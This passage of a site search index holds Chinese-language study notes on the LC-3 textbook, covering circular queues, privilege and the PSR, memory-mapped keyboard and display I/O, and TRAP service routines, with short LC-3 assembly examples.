<p>\u4f8b\u5982\u5b58\u653e\u4e00\u4e2a\u201chello\u201d\u9700\u8981\u516d\u4e2a\u7a7a\u95f4\uff0c\u6700\u540e\u4e00\u4e2a\u5fc5\u987b\u662fx0000\uff0c\u8868\u793a\u5b57\u7b26\u4e32\u7684\u7ed3\u5c3e</p>"},{"location":"ZJU-course/%E8%AE%A1%E6%A6%82/Introduction%20to%20Computing%20Systems_%20From%20Bits%20%26%20Gates%20to%20C%20%26%20Beyond/#_4","title":"\u6570\u7ec4\u548c\u94fe\u8868","text":"<p>\u6570\u7ec4access\u5feb\uff0c\u63d2\u5165\u6162 \u94fe\u8868access\u6162\uff0c\u63d2\u5165\u5feb linked list</p>"},{"location":"ZJU-course/%E8%AE%A1%E6%A6%82/Introduction%20to%20Computing%20Systems_%20From%20Bits%20%26%20Gates%20to%20C%20%26%20Beyond/#queue","title":"queue","text":"<p>FIFO\uff0c\u5148\u8fdb\u5148\u51fa</p> <p>\u5bf9\u4e8e\u961f\u5217\uff0c\u6211\u4eec\u7528R3\u4f5c\u4e3a\u524d\u6307\u9488\uff0cR4\u4f5c\u4e3a\u540e\u6307\u9488 \u6211\u4eec\u5c06x8000\u5230x8005\u8fd9\u516d\u5757\u5185\u5b58\u4f5c\u4e3a\u961f\u5217</p> <p>\u961f\u5217\u7684\u57fa\u672c\u64cd\u4f5c\u662f\u524d\u51fa\u540e\u8fdb\uff0cpop\u64cd\u4f5c\uff0cR3\u52a0\u4e00\uff0cpop\u51fa\u7684\u5185\u5bb9\u653e\u5230R0\u4e0a push\u64cd\u4f5c\uff0cR4\u52a0\u4e00\uff0cR0\u91cc\u7684\u5185\u5bb9\u8f7d\u5165\u5230R4\u5730\u5740\u4e0a</p> <pre><code>;\u8fd9\u662f\u57fa\u672c\u7684\u64cd\u4f5c\uff0c\u4e0d\u8003\u8651\u8d8a\u754c\u7684\u72b6\u6001\nADD R3,R3,#1\nLDR R0,R3,#0\n;\nADD R4,R4,#1\nSTR R0,R4,#1\n;\nfront  1\n       2\nrear   3\n       4\n;\u5bf9\u4e8e\u8fd9\u6837\u4e00\u4e2a\u961f\u5217\u6765\u8bf4\uff0c2 3\u662f\u961f\u5217\u91cc\u7684\u5143\u7d20 \n</code></pre> <p>\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u6ce8\u610f\u5230\uff0c\u80fd\u7528\u4f5c\u961f\u5217\u7684\u5185\u5bb9\u662fx8000\u5230x8005 \u4f46\u662f\u7531\u4e8epop\u548cpush\u64cd\u4f5c\u90fd\u5728\u8ba9\u6307\u9488\u589e\u52a0\uff0c\u5f88\u5feb\u961f\u5217\u5c31\u4f1a\u5230x8005\u800c\u65e0\u6cd5\u4f5c\u7528\uff0c\u4e8e\u662f\u8fd9\u91cc\u6211\u4eec\u91c7\u7528\u4e86 \u73af\u7ed5\u7684\u65b9\u6cd5\uff0c\u6307\u9488\u5230x8005\u53c8\u8981\u52a0\u4e00\u7684\u65f6\u5019\uff0c\u4ecex8000\u5f00\u59cb</p> <pre><code>LD R2, LAST\nADD R2,R3,R2\nBRnp SKIP_1\nLD R3,FIRST\nBR SKIP_2\nSKIP_1 ADD R3,R3,#1\nSKIP_2 LDR R0,R3,#0 ; R0 gets the front of the queue\nRET\nLAST .FILL x7FFB ; LAST contains the negative of 8005\nFIRST .FILL x8000\n</code></pre> <p>\u4e00\u4e2a\u961f\u5217\u5982\u67096\u4e2a\u7a7a\u95f4\uff0c\u90a3\u4e48\u5176\u6700\u591a\u5bb9\u7eb35\u4e2a\u5143\u7d20</p> <p>\u5982\u679cfront=rear \u89c6\u4f5c\u7a7a\u961f\u5217\uff0c\u82e5front-1=rear\uff0c\u89c6\u4f5c\u6ee1\u961f\u5217</p> <p>\u961f\u5217\u548c\u6808\u4e00\u6837\uff0c\u7a7a\u4e86\u4e0d\u80fdpop\uff0c\u6ee1\u4e86\u4e0d\u80fdpush \u56e0\u6b64\u7528R5\u4f5c\u4e3a\u8fd4\u56de\u503c\uff0c\uff0c\u770bpop\u548cpush\u662f\u5426\u6210\u529f</p> <p>queue\u64cd\u4f5c\u7684\u5b8c\u6574\u4ee3\u7801\u89c1\u4e66\u672c\u7b2c\u516b\u7ae037</p> <p>\u200d</p>"},{"location":"ZJU-course/%E8%AE%A1%E6%A6%82/Introduction%20to%20Computing%20Systems_%20From%20Bits%20%26%20Gates%20to%20C%20%26%20Beyond/#chapter-9-io","title":"chapter 9 I/O","text":"<p>the TRAP instruction enables us to tell the OS what we need done by means of a trap vector.  </p> <p>\u5bf9\u4e8eTRAP\u6307\u4ee4\uff0c\u66f4\u51c6\u786e\u7684\u8bf4\u6cd5\u662fsystem call\uff0c\u5728\u8fd9\u4e00\u7ae0\u91cc\u9700\u8981\u77e5\u9053input and output\u5728LC-3\u4e2d\u662f\u5982\u4f55\u5de5\u4f5c\u7684\uff0c\u5728\u7528\u6237\u7a0b\u5e8f\u8c03\u7528TRAP\u662f\u53d1\u751f\u4e86\u4ec0\u4e48</p> <p>PSR  15\u4f4dpriv  10\u4f4d\u52308\u4f4dpriority\uff08\u81ea\u5df1\u7684\u7a0b\u5e8f\u662f0\uff09   3\u4f4d\u52300\u4f4d nzp</p>"},{"location":"ZJU-course/%E8%AE%A1%E6%A6%82/Introduction%20to%20Computing%20Systems_%20From%20Bits%20%26%20Gates%20to%20C%20%26%20Beyond/#privilege-priority-and-the-memory-address-space","title":"privilege, priority, and the memory address space","text":"<p>\u8fd9\u662f\u9488\u5bf9OS\u800c\u8a00\u7684</p> <p>pirviliege</p> <p>\u542b\u4e49\u662f\u6307\u7279\u6743\uff0c\u62e5\u6709\u6743\u9650\u53bb\u8bbf\u95ee\u548c\u4f7f\u7528\u67d0\u4e9b\u6307\u4ee4\u548c\u5185\u5b58\u7a7a\u95f4 \u4f8b\u5982\u6211\u4eec\u4e0d\u4f1a\u5e0c\u671b\u968f\u4fbf\u4e00\u4e2a\u7a0b\u5e8f\u80fd\u4f7f\u7528\u8ba9\u8ba1\u7b97\u673a\u505c\u673a\u7684\u6307\u4ee4\uff0c\u6211\u4eec\u4e5f\u4e0d\u4f1a\u5e0c\u671b\u968f\u4fbf\u4e00\u4e2a\u7a0b\u5e8f\u80fd\u591f\u8bbf\u95ee\u8ba1\u7b97\u673a\u4e13\u95e8\u4e3aOS\u51c6\u5907\u7684\u5185\u5b58\u7a7a\u95f4</p> <p>\u6211\u4eec\u901a\u5e38\u7528supervisor privilege\u6765\u8868\u793a\u7279\u6743\u7684\uff0c\u5982\u679c\u4e00\u4e2a\u7a0b\u5e8f\u4ee5supervisor mode\u8fd0\u884c\uff0c\u90a3\u4e48\u5b83\u5e94\u5f53\u53ef\u4ee5\u8bbf\u95ee\u6240\u6709\u7684\u5185\u5b58\u548c\u6240\u6709\u7684\u6307\u4ee4\uff0c\u5982\u679c\u4e00\u4e2a\u7a0b\u5e8f\u4ee5user mode\u8fd0\u884c\uff0c\u90a3\u4e48\u5b83\u8bbf\u95ee\u7684\u6307\u4ee4\u548c\u5185\u5b58\u90fd\u662f\u6709\u9650\u5236\u7684</p> <p>priority</p> <p>\u6211\u4eec\u5bf9\u8ba1\u7b97\u673a\u4e0a\u7684\u7a0b\u5e8f\u7684\u6267\u884c\u4f1a\u6709\u4e00\u4e2a\u4f18\u5148\u7ea7\u7684\u6392\u540d\uff0c\u6bd4\u5982\u6211\u4eec\u4f1a\u628a\u968f\u4fbf\u4e00\u4e2a\u7a0b\u5e8f\u7684\u6267\u884c\u4f18\u5148\u7ea7\u6392\u4e3a0\uff0c\u952e\u76d8\u8f93\u5165\u6392\u4e3a4\uff0c\u63d2\u5165\u7535\u6e90\u7684\u4e8b\u4ef6\u6392\u4e3a6\uff0c\u5f53\u4f18\u5148\u7ea7\u66f4\u9ad8\u7684\u7a0b\u5e8f\u8fd0\u884c\u65f6\uff0c\u5c31\u4f1a\u4e2d\u65ad\u4f18\u5148\u7ea7\u8f83\u4f4e\u7684\u7a0b\u5e8f</p> <p>privilege and priority are two orthogonal notions \u7279\u6743\u548c\u4f18\u5148\u7ea7\u662f\u4e24\u4e2a\u6b63\u4ea4\u6982\u5ff5\uff0c\u4e5f\u5c31\u662f\u8bf4\u5b83\u4eec\u4e24\u4e2a\u662f\u65e0\u5173\u7684\uff0c\u4e00\u4e9b\u4e8b\u4ef6\u53ef\u80fd\u4f18\u5148\u7ea7\u5f88\u9ad8\uff0c\u4f46\u662f\u4e0d\u8868\u793a\u5b83\u4eec\u6709\u5f88\u9ad8\u7684\u6743\u9650\uff0c\u53cd\u4e4b\u4ea6\u7136</p> <p>PSR</p> <p>psr\u662fthe processor status register \u5904\u7406\u5668\u72b6\u6001\u5bc4\u5b58\u5668\uff0c\u548cPC\u4e00\u6837\uff0c\u662f\u6bcf\u4e2a\u6307\u4ee4\u90fd\u6709\u7684\u91cd\u8981\u5bc4\u5b58\u5668\uff0c\u5176\u5185\u5bb9\u8868\u793a\u5f88\u591a\u4e1c\u897f</p> <p>\u5176\u672c\u8eab\u4e5f\u662f16\u4f4d\u7684 \u7b2c15\u4f4d\u8868\u793a\u662f\u6743\u9650\uff0c0\u8868\u793a\u6709\u4e3b\u7ba1\u6743\u9650\uff0c1\u8868\u793a\u65e0\u4e3b\u7ba1\u6743\u9650\u3002 \u7b2c10\u4f4d\u52308\u4f4d\uff0c\u8868\u793a\u4f18\u5148\u7ea7\uff0c\u6700\u9ad8\u4e3a7\uff0c\u6700\u4f4e\u4e3a0 \u7b2c2\u4f4d\u52300\u4f4d\uff0c\u8868\u793aNZP</p> <p>organization of memory</p> <p>LC-3\u5e7f\u4e49\u7684\u5b58\u50a8\u7a7a\u95f4\u662fx0000\u5230xFFFF \u5176\u4e2dx0000\u5230x2FFF\u662f\u7279\u6743\u7a7a\u95f4\uff0c\u5b58\u653e\u64cd\u4f5c\u7cfb\u7edf\u7684\u5404\u79cd\u6570\u636e\u7ed3\u6784\u548c\u4ee3\u7801\uff0c\u9700\u8981\u4e3b\u7ba1\u6743\u9650\u53bb\u8bbf\u95ee x3000\u5230xFDFF\u662f\u975e\u7279\u6743\u7a7a\u95f4\uff0c\u4e0d\u9700\u8981\u6743\u9650\u5c31\u53ef\u4ee5\u8bbf\u95ee xFE00\u5230xFFFF\uff0c\u51c6\u786e\u6765\u8bb2\u4e0d\u662f\u5185\u5b58\u7a7a\u95f4\uff0c\u5176\u672c\u8eab\u662f\u5bf9\u4e00\u4e9b\u7279\u6b8a\u7684\u5bc4\u5b58\u5668\uff0c\u5305\u62ecIO\u5bc4\u5b58\u5668\u548cPSR\u7b49\u7684\u6620\u5c04\uff1f\u6709\u65f6\u4e5f\u628a\u8fd9\u6bb5\u7a7a\u95f4\u79f0\u4e3aIO\u9875</p> <p>SSP\u548cUSP\u5206\u522b\u662f\u7cfb\u7edf\u7a7a\u95f4\u548c\u7528\u6237\u7a7a\u95f4\u7684\u5806\u6808\u6307\u9488\uff0c\u4e00\u4e2a\u7a0b\u5e8f\u5728\u4efb\u610f\u65f6\u95f4\u53ea\u80fd\u5728\u67d0\u4e2a\u786e\u5b9a\u7684\u6a21\u5f0f\u4e0b\u8fd0\u884c\uff0c\u56e0\u6b64\u4e24\u4e2a\u5806\u6808\u53ea\u6709\u4e00\u4e2a\u662f\u6d3b\u52a8\u7684\uff0c\u5bc4\u5b58\u5668R6\u4e00\u822c\u7528\u6765\u505a\u6d3b\u52a8\u5806\u6808\u7684\u6808\u6307\u9488\uff0c\u7cfb\u7edf\u8fd8\u7ed9\u6211\u4eec\u63d0\u4f9b\u4e86\u4e24\u4e2a\u5bc4\u5b58\u5668\uff0cSaved_SSP and Saved_USP\uff0c\u7528\u6765\u5b58\u50a8\u6ca1\u6709\u88ab\u4f7f\u7528\u7684\u90a3\u4e2a\u6808\u6307\u9488\u7684\u72b6\u6001\uff0c\u5f53\u72b6\u6001\u6539\u53d8\u7684\u65f6\u5019\uff0c\u4f8b\u5982\u7cfb\u7edf\u6a21\u5f0f\u8f6c\u5230\u7528\u6237\u6a21\u5f0f\u65f6\uff0c\u5c06\u6808\u6307\u9488\u5b58\u5230Saved_SSP\u4e0a\uff0c\u7136\u540e\u628aSaved_USP\u8bfb\u53d6\u5230\u5f53\u524d\u7684\u6808\u6307\u9488\u4e0a</p> <p>\u200b\u200b</p>"},{"location":"ZJU-course/%E8%AE%A1%E6%A6%82/Introduction%20to%20Computing%20Systems_%20From%20Bits%20%26%20Gates%20to%20C%20%26%20Beyond/#inputoutput","title":"input/output","text":"<p>IO\u8bbe\u5907\u4f7f\u7528\u5bc4\u5b58\u5668\u6765\u5904\u7406\u6570\u636e\uff0c\u4e0d\u540c\u7684IO\u8bbe\u5907\u53ef\u80fd\u4f1a\u9700\u8981\u4e0d\u540c\u6570\u91cf\u7684\u5bc4\u5b58\u5668\u6765\u5904\u7406\uff0c\u4f46\u662f\u6700\u57fa\u7840\u7684IO\u8bbe\u5907\u9700\u8981\u81f3\u5c11\u4e24\u4e2a\u5bc4\u5b58\u5668\uff0c\u4e00\u4e2a\u4fdd\u5b58\u6570\u636e\uff0c\u4e00\u4e2a\u4fdd\u5b58\u72b6\u6001</p> <p>All IO activity is controlled by instuctions in the computer's ISA. </p> <p>memory-mapped IO vs special IO instructions</p> <p>\u6307\u4ee4\u9700\u8981\u8bbf\u95eeIO\u5bc4\u5b58\u5668\uff0c\u9700\u8981\u660e\u786e\u5730\u627e\u5230\u76ee\u6807\u5bc4\u5b58\u5668\uff0c\u8fd9\u6709\u4e24\u79cd\u5b9e\u73b0\u65b9\u5f0f \u4e00\u4e2a\u662f\u4e13\u95e8\u7684IO\u6307\u4ee4\uff0c\u53e6\u4e00\u79cd\u65b9\u6cd5\uff0c\u4e5f\u662f\u591a\u6570\u4f7f\u7528\u7684\u65b9\u6cd5\uff0c\u662f\u91c7\u7528\u5185\u5b58\u64cd\u4f5c\u7684\u65b9\u5f0f\u6765\u5b9e\u73b0</p> <p>memory-mapped IO\uff0c\u7ed9\u6bcf\u4e2a\u5bc4\u5b58\u5668\u4e00\u4e2a\u5185\u5b58\u5730\u5740 \u5f53\u6211\u4eec\u4f7f\u7528load\u6307\u4ee4\u8bbf\u95ee\u7684\u5185\u5b58\u5730\u5740\u771f\u597d\u5bf9\u5e94\u8f93\u5165\u5bc4\u5b58\u5668\uff0c\u90a3\u4e48\u8fd9\u5c31\u662f\u4e00\u6761\u8f93\u5165\u6307\u4ee4 \u5f53\u6211\u4eec\u4f7f\u7528store\u6307\u4ee4\u8bbf\u95ee\u7684\u5185\u5b58\u5730\u5740\u6b63\u597d\u5bf9\u5e94\u8f93\u51fa\u5bc4\u5b58\u5668\uff0c\u90a3\u4e48\u8fd9\u5c31\u662f\u4e00\u6761\u8f93\u51fa\u6307\u4ee4</p> <p>\u5728LC-3\u4e2dxFE00\u5230xFFFF\u5c31\u662f\u4e3a\u8bbe\u5907\u5bc4\u5b58\u5668\u9884\u7559\u7684\u5185\u5b58\u7a7a\u95f4</p> <p>asynchronous vs synchronous \u5f02\u6b65\u548c\u540c\u6b65</p> <p>\u6b63\u5e38\u6765\u8bf4\uff0cIO\u7684\u901f\u5ea6\u4e00\u5b9a\u662f\u6bd4\u5904\u7406\u5668\u5904\u7406\u7684\u901f\u5ea6\u6162\u5f88\u591a\u7684\uff0c\u800c\u4e14\u7528\u6237IO\u7684\u901f\u5ea6\u662f\u5b9e\u65f6\u53d8\u5316\u7684\uff0c\u56e0\u6b64IO\u548c\u5904\u7406\u5668\u5728\u7edd\u5927\u591a\u6570\u60c5\u51b5\u4e0b\u90fd\u662f\u5f02\u6b65\u7684</p> <p>\u5728\u5f02\u6b65\u901a\u4fe1\u7684\u60c5\u51b5\u4e0b\uff0c\u9700\u8981\u4e00\u5b9a\u7684\u534f\u8baeprotocol\u6216\u8005\u8bf4\u63e1\u624bhandshaking\u6765\u63a7\u5236\u63a5\u53d7\u548c\u53d1\u9001\uff0c\u4f8b\u5982\u5728\u952e\u76d8\u8f93\u5165\u4e2d\uff0c\u6211\u4eec\u91c7\u7528\u4e00\u4e2a\u5355bit\u7684\u72b6\u6001\u5bc4\u5b58\u5668\uff0c\u6765\u5224\u65ad\u662f\u5426\u6709\u65b0\u7684\u5b57\u7b26\u8f93\u5165\uff0c\u4f9d\u9760\u8fd9\u4e2a\u5c31\u53ef\u4ee5\u5b9e\u73b0\u5f02\u6b65\u5904\u7406\uff0c\u7528\u6237\u6bcf\u8f93\u5165\u4e00\u4e2a\u5b57\u7b26\uff0c\u8fd9\u4e2a\u5bc4\u5b58\u5668\u5c31\u88ab\u7f6e\u4f4d\uff0c\u5904\u7406\u5668\u53bb\u8bfb\u53d6\u8fd9\u4e2a\u5bc4\u5b58\u5668\u91cc\u7684\u5185\u5bb9\uff0c\u5e76\u628a\u5b83\u6e050\uff0c\u5982\u679c\u8fd9\u4e2a\u5bc4\u5b58\u5668\u88ab\u6e050\uff0c\u5904\u7406\u5668\u5c31\u4e0d\u4f1a\u518dload\u8fd9\u4e2a\u5bc4\u5b58\u5668\u91cc\u7684\u5185\u5bb9</p> <p>interrupt-driven vs polling</p> <p>\u4e2d\u65ad\u9a71\u52a8\u548c\u8f6e\u8be2\uff0c\u662f\u7528\u6237\u548c\u5904\u7406\u5668\u4e4b\u95f4\u7684\u4e24\u79cd\u4ea4\u4e92\u65b9\u5f0f\uff0c \u4e2d\u65ad\u9a71\u52a8\u662f\u4ee5\u7528\u6237\u4f5c\u4e3a\u4e3b\u5bfc\uff0c\u5f53\u7528\u6237\u7684\u6570\u636e\u8f93\u5165\u597d\u65f6\uff0c\u4e3b\u52a8\u901a\u77e5\u5904\u7406\u5668\u53bb\u5904\u7406 \u8f6e\u8be2\u662f\u5904\u7406\u5668\u4e0d\u65ad\u53d1\u51fa\u4fe1\u606f\u8bbf\u95ee\u72b6\u6001\u5bc4\u5b58\u5668\uff0c\u76f4\u5230\u6709\u65b0\u7684\u8f93\u5165</p>"},{"location":"ZJU-course/%E8%AE%A1%E6%A6%82/Introduction%20to%20Computing%20Systems_%20From%20Bits%20%26%20Gates%20to%20C%20%26%20Beyond/#input-from-the-keyboard","title":"input from the keyboard","text":"<p>basic input registers KBDR and KBSR</p> <p>\u8f93\u5165\u529f\u80fd\u9700\u8981\u4e24\u4e2a\u5bc4\u5b58\u5668\uff0c\u4e00\u4e2a\u952e\u76d8\u6570\u636e\u5bc4\u5b58\u5668KBDR\uff0c\u5b58\u653e\u8f93\u5165\u5b57\u7b26\u7684ASCII\uff0c\u4e8c\u662f\u952e\u76d8\u72b6\u6001\u5bc4\u5b58\u5668KBSR\uff0c\u5b58\u50a8\u952e\u76d8\u7684\u72b6\u6001\uff0c\u9644\u5f55\u91cc\u5199\u4e86\u8fd9\u4e24\u4e2a\u5bc4\u5b58\u5668\u7684\u5730\u5740\uff0c</p> <p>\u5b83\u4eec\u4e5f\u662f16\u4f4d\u5bc4\u5b58\u5668\uff0c\u4f46\u662f\u53ea\u4f1a\u7528\u5230\u5176\u4e2d\u51e0\u4f4d KBDR\u53ea\u4f1a\u7528\u52307\u4f4d\u52300\u4f4d\u6765\u5b58\u50a8ASCII       \u5730\u5740\u4e3axFE02 KBSR\u53ea\u4f1a\u752815\u4f4d\u6765\u5b58\u50a8\u72b6\u6001\u4fe1\u606f       \u5730\u5740\u4e3axFE00</p> <p>basic input service routine</p> <p>\u5f53\u952e\u76d8\u8f93\u5165\u4e00\u4e2a\u5b57\u7b26\u65f6\uff0c\u5176ASCII\u88ab\u5b58\u5165KBDR\uff0c\u952e\u76d8\u7535\u8def\u5c06KBSR\u7f6e\u4e3a1\uff0c\u5904\u7406\u5668\u8bfb\u53d6KBDR\u540e\uff0cKBSR\u81ea\u52a8\u7f6e\u4e3a0\uff0c\u6b64\u65f6\u952e\u76d8\u624d\u80fd\u518d\u6b21\u8f93\u5165\u5b57\u7b26</p> <p>\u5728\u8f6e\u8be2\u7684\u60c5\u51b5\u4e0b\uff0c\u7cfb\u7edf\u4f1a\u4e0d\u65ad\u5730\u6d4b\u8bd5KBSR\uff0c\u76f4\u5230\u5176\u53d8\u62101\uff0c\u90a3\u4e48\u6b64\u65f6\u4f1a\u628aKDSR\u7684\u5185\u5bb9\u8bfb\u5230\u4e00\u4e2a\u672c\u5730\u5bc4\u5b58\u5668\u4e2d\uff0c\u5e76\u5c06KBSR\u7f6e\u4e3a0\uff0c\u5e76\u4e14\u81ea\u52a8\u6e05\u9664KBDR\uff08\u9632\u6b62\u4e00\u4e2a\u5b57\u7b26\u88ab\u53cd\u590d\u8bfb\u5165\uff09</p> <pre><code>01 START LDI   R1, A ; Test for\n02   BRzp  START ; character input\n03   LDI   R0, B\n04   BRnzp NEXT_TASK ; Go to the next task\n05 A     .FILL xFE00 ; Address of KBSR\n06 B     .FILL xFE02 ; Address of KBDR\n;\u8fd9\u662f\u4e00\u4e2a\u7a0b\u5e8f\uff0c\u7528\u4e8e\u7b49\u5f85\u7528\u6237\u7684\u8f93\u5165\uff0c\u4e00\u65e6\u8f93\u5165\u4e86\u4e4b\u540e\u5c06\u5b57\u7b26\u8bfb\u53d6\u5230R0\u4e0a\n;\n</code></pre> <p>implementation of memory-mapped input</p> <p>\u5728\u6709\u5185\u5b58\u6620\u5c04\u7684\u60c5\u51b5\u4e0b\uff0cload\u548cstore\u6307\u4ee4\u90fd\u6709\u4e86\u65b0\u7684\u542b\u4e49 \u5c06\u8fd9\u4e2a\u5730\u5740\u6620\u5c04\u7ed9\u8bbe\u5907\u5bc4\u5b58\u5668\uff0c\u5c31\u53ef\u4ee5\u5728\u4e0d\u521b\u9020\u65b0\u7684\u6307\u4ee4\u7684\u60c5\u51b5\u4e0b\uff0c\u7528\u539f\u6709\u7684load\u6307\u4ee4\uff0c\u5b9e\u73b0\u5c06\u8bbe\u5907\u5bc4\u5b58\u5668\u7684\u5185\u5bb9\u62f7\u8d1d\u5230\u6211\u4eec\u7684\u76ee\u6807\u5bc4\u5b58\u5668\u8fd9\u4e00\u5de5\u4f5c</p>"},{"location":"ZJU-course/%E8%AE%A1%E6%A6%82/Introduction%20to%20Computing%20Systems_%20From%20Bits%20%26%20Gates%20to%20C%20%26%20Beyond/#output-to-the-monitor","title":"output to the monitor","text":"<p>\u4e0e\u8f93\u5165\u529f\u80fd\u76f8\u540c\uff0c\u8f93\u51fa\u5de5\u4f5c\u4e5f\u6709\u4e24\u4e2a\u57fa\u672c\u7684\u5bc4\u5b58\u5668</p> <p>DDR\uff0c\u5b58\u50a8ASCII \u7528\u516b\u4f4d\uff0cxFE06 DSR\uff0c\u5b58\u50a8\u72b6\u6001\uff0c\u7528\u4e00\u4f4d\uff0cxFE04</p> <p>the basic output service routine</p> <p>\u57fa\u672c\u7684\u8f93\u51fa\u8fc7\u7a0b\u662f\u8fd9\u6837\u7684\uff1aLC-3\u5c06ASCII\u8f93\u5165\u5230DDR\uff0c\u663e\u793a\u5668\u7535\u8def\u81ea\u52a8\u6e05\u9664DSR\uff0c\u5f53\u5b57\u7b26\u6210\u529f\u663e\u793a\u5728\u5c4f\u5e55\u4e0a\u65f6\uff0c\u5c06DSR\u81ea\u52a8\u8bbe\u7f6e\u4e3a1\uff0c\u5176\u4e2d\u5f53DSR15\u4f4d\u4e3a1\u65f6\uff0c\u8868\u793a\u53ef\u4ee5\u8fdb\u884c\u4e0b\u4e00\u6b21\u8f93\u51fa\uff0c\u5f53DSR15\u4f4d\u4e3a0\u65f6\uff0c\u8868\u793a\u5fd9\uff0c\u4e0d\u80fd\u63a5\u53d7\u4e0b\u4e00\u6b21\u5de5\u4f5c</p> <p>\u91c7\u7528\u8f6e\u8be2\u6a21\u5f0f\u7684\u8bdd\uff0c\u7cfb\u7edf\u8981\u4e0d\u65ad\u5730\u6d4b\u8bd5DSR\uff0c\u76f4\u5230\u5b83\u4e3a1\uff0c\u53ef\u4ee5\u63a5\u53d7\u4e0b\u4e00\u6b21\u5de5\u4f5c</p> <pre><code>01 START LDI R1, A ; Test to see if\n02   BRzp START ; output register is ready\n03   STI R0, B\n04   BRnzp NEXT_TASK\n05 A     .FILL xFE04 ; Address of DSR\n06 B     .FILL xFE06 ; Address of DDR\n</code></pre> <p>implementation of memory-mapped output</p> <p>\u5185\u5b58\u6620\u5c04\u7684\u5b9e\u73b0\uff0c\u8fd9\u91cc\u4e0e\u8f93\u5165\u8fc7\u7a0b\u975e\u5e38\u76f8\u4f3c\uff0c\u53ea\u4e0d\u8fc7\u628aload\u6307\u4ee4\u6539\u4e3a\u4e86store\u6307\u4ee4\uff0c\u628a\u76ee\u6807\u5bc4\u5b58\u5668\u91cc\u7684\u5185\u5bb9\u5b58\u50a8\u5230\u4e86\u8bbe\u5907\u5bc4\u5b58\u5668\u4e2d\u3002</p> <p>one example keyboard echo \u5c06\u6253\u51fa\u6765\u7684\u5b57\u663e\u793a\u51fa\u6765\u7684\u7a0b\u5e8f</p> <pre><code>01 START LDI R1, KBSR ; Test for character input\n02  BRzp START\n03  LDI R0, KBDR\n04 ECHO LDI R1, DSR ; Test output register ready\n05  BRzp ECHO\n06  STI R0, DDR\n07  BRnzp NEXT_TASK\n08 KBSR .FILL xFE00 ; Address of KBSR\n09 KBDR .FILL xFE02 ; Address of KBDR\n0A DSR  .FILL xFE04 ; Address of DSR\n0B DDR  .FILL xFE06 ; Address of DDR\n</code></pre> <p>\u6211\u4eec\u4f1a\u5199\u4e00\u4e2a\u66f4\u52a0\u5b8c\u6574\u7684\u8f93\u5165\u8f93\u51fa\u7a0b\u5e8f\uff0c\u89c1\u6587\u4ef6IOtest</p> <p>memory-mapped IO revisited \u56de\u987e\u5185\u5b58\u6620\u5c04IO</p> <p>\u6211\u4eec\u5728\u524d\u9762\u5df2\u7ecf\u4e86\u89e3\u8fc7\u5185\u5b58\u6620\u5c04IO\u7684\u60c5\u5f62\uff0c\u4f46\u90a3\u662f\u9488\u5bf9\u8f6e\u8be2\u60c5\u51b5\u4e0b\u6709\u6548\u7684\u5185\u5b58\u6620\u5c04IO \u8981\u60f3\u652f\u6301\u4e2d\u65ad\u9a71\u52a8\u7684IO\uff0c\u5fc5\u987b\u8ba9\u4e24\u4e2a\u72b6\u6001\u5bc4\u5b58\u5668\u662f\u53ef\u8bfb\u53ef\u5199\u7684\uff0c\u8fd9\u6837\u624d\u80fd\u5728\u4e2d\u65ad\u4fe1\u53f7\u6765\u7684\u65f6\u5019\u6539\u53d8\u72b6\u6001\u5bc4\u5b58\u5668</p> <p>\u5b9e\u9645\u4e0a\u7684\u6570\u636e\u901a\u8def\u89c1\u4e66\u672c\u7b2c\u4e5d\u7ae0P15</p> <p>\u200d</p>"},{"location":"ZJU-course/%E8%AE%A1%E6%A6%82/Introduction%20to%20Computing%20Systems_%20From%20Bits%20%26%20Gates%20to%20C%20%26%20Beyond/#operating-system-service-routineslc-3-trap-routines","title":"operating system service routines(LC-3 trap routines)","text":"<p>trap\u6307\u4ee4\uff0c\u662f\u8ba9\u6211\u4eec\u8c03\u7528\u64cd\u4f5c\u7cfb\u7edf\u7684\u7a0b\u5e8f\uff0c\u6765\u8fdb\u884c\u4e00\u7cfb\u5217\u7684\u64cd\u4f5c\uff0c\u6700\u5178\u578b\u7684\u5c31\u662f\u5728IO\u8fc7\u7a0b\u4e2d\uff0c\u8fd9\u6837\u505a\u6709\u4e24\u4e2a\u597d\u5904\uff0c\u9996\u5148\uff0cIO\u8fc7\u7a0b\u4f1a\u4f7f\u7528\u5230\u9700\u8981\u7279\u6743\u8bbf\u95ee\u7684\u8bbe\u5907\u5bc4\u5b58\u5668\u7b49\uff0c\u800c\u64cd\u4f5c\u7cfb\u7edf\u6709\u7279\u6743\u8bbf\u95ee\u7684\u80fd\u529b\uff1b\u5176\u6b21\uff0c\u64cd\u4f5c\u7cfb\u7edf\u7684\u7a0b\u5e8f\u4f7f\u5f97\u6211\u4eec\u4e0d\u9700\u8981\u4e86\u89e3\u5f88\u591a\u7684\u7ec6\u8282\uff0c\u800c\u53ef\u4ee5\u5728\u66f4\u597d\u66f4\u5b89\u5168\u5730\u4f7f\u7528\u90a3\u4e9b\u53ea\u6709\u8bbf\u95ee\u7279\u6743\u533a\u57df\u624d\u80fd\u5b9e\u73b0\u7684\u529f\u80fd</p> <p>\u5728trap\u6307\u4ee4\u8c03\u7528\u5b8c\u64cd\u4f5c\u7cfb\u7edf\u7684\u7a0b\u5e8f\u4e4b\u540e\uff0c\u7a0b\u5e8f\u53c8\u4f1a\u56de\u5230trap\u6307\u4ee4\u7684\u4e0b\u4e00\u6761\uff0c\u8fd9\u6574\u4e2a\u8fc7\u7a0b\u79f0\u4e3aservice call or system call \u670d\u52a1\u8c03\u7528\u6216\u8005\u7cfb\u7edf\u8c03\u7528</p> <p>trap mechanism trap\u7684\u673a\u5236</p> <p>trap\u673a\u5236\u5305\u542b\u4e00\u4e0b\u5185\u5bb9 1.service routine \u670d\u52a1\u7a0b\u5e8f\uff0c\u4e5f\u5373\u64cd\u4f5c\u7cfb\u7edf\u63d0\u4f9b\u7684\u6240\u6709\u670d\u52a1\uff0cLC-3\u63d0\u4f9b256\u4e2a\u670d\u52a1\uff0c\u5728\u9644\u5f55\u8868A2\u53ef\u4ee5\u627e\u5230 2.\u8d77\u59cb\u5730\u5740\u8868\uff0c\u8fd9256\u4e2a\u670d\u52a1\u7a0b\u5e8f\u7684\u8d77\u59cb\u5730\u5740\uff0c\u88ab\u653e\u5728x0000\u5230x00FF\uff0c\u4f8b\u5982output\u670d\u52a1\u7684\u8d77\u59cb\u5730\u5740\u5b58\u653e\u5728x0021\uff0cx0021\u7684\u5185\u5bb9\u662fx0420\uff0c\u4e5f\u5c31\u662f\u8bf4output\u670d\u52a1\u8d77\u59cb\u5730\u5740\u662fx0420 